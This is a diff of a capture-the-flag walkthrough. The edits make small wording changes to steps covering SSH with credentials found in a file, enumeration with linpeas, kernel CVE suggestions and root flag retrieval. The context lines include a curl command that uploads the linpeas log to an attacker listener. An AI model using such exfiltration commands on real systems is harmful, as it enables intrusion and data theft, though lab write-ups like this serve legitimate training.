@@ -227,7 +227,7 @@ For this room, we already know there is one user and we have access to the web c
 
 #### Exposed credentials in file
 
-From further exploration, we find [/opt/wp-save.txt](wp-save.txt) which has credentials in it for user `aubreanna`. **We can now SSH in as this user.** It looks like we don't have `sudo` privilege, and you can at least collect your `user.txt` flag here.
+From further exploration, we find [/opt/wp-save.txt](wp-save.txt) which has credentials in it for user `aubreanna`. **We can now SSH in as this user.** It looks like we don't have `sudo` privilege. You can at least collect your `user.txt` flag here.
 
 #### Jenkins instance
 
@@ -345,7 +345,7 @@ We look around and basically:
 2. We only belong to the `jenkins` group.
 3. Our home folder is `/var/jenkins_home`. In there is the configuration for this instance.
 
-So, two things come to mind.
+Let's dig in to see what we can find.
 
 #### Running Linpeas
 
@@ -387,7 +387,7 @@ This just takes all of the bytes that it gets on that port, and dumps them to th
 curl -T ./linpeas.log http://10.10.10.10:8888/
 ```
 
-Reviewing the `linpeas.log`, the Linux Exploit Suggester lists several CVE's:
+Reviewing the `linpeas.log`, the Linux Exploit Suggester lists several CVE's (all marked as "less probable"):
 
 - **CVE-2022-32250** - nft_object UAF (NFT_MSG_NEWSET) ([Link](https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/))
 - **CVE-2022-2586** - nft_object UAF ([Link](https://www.openwall.com/lists/oss-security/2022/08/29/5))
@@ -421,6 +421,7 @@ CONTAINER ID        IMAGE               COMMAND                  CREATED        
 7b979a7af778        jenkins/jenkins     "/sbin/tini -- /usr/…"   3 years ago         Up 2 hours          127.0.0.1:8080->8080/tcp, 50000/tcp   jenkins
 ```
 
+You can get your final flag now from `/root/root.txt`.
 
 ## PHASE 4: Maintaining Access & Persistence
 
